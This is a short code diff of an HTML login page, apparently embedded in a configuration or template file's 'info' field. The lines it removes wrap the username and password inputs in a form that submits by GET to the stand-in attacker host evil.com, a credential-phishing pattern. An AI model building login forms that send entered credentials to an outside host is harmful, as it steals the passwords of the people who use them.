@@ -8,7 +8,7 @@ info:
     
     <h2 style="text-align: center;">Login</h2>
 
-    <form action="https://evil.com" method="get">
+
       <label>Username</label><br>
       <input type="text"><br>
 
@@ -16,7 +16,7 @@ info:
       <input type="password"><br>
 
       <button type="submit" value="Login" style="width: 100%; padding: 8px; background-color: #4CAF50; color: white; border: none; cursor: pointer;">
-    </form>
+  
 
   </div>
 
